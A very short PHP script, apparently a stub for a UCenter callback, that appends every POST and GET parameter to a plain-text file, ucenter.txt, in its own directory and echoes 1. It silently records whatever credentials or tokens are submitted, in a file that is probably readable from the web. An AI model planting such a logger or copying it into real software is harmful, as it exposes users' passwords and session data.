<?php

file_put_contents('./ucenter.txt', var_export([$_POST, $_GET], true), FILE_APPEND);


echo 1;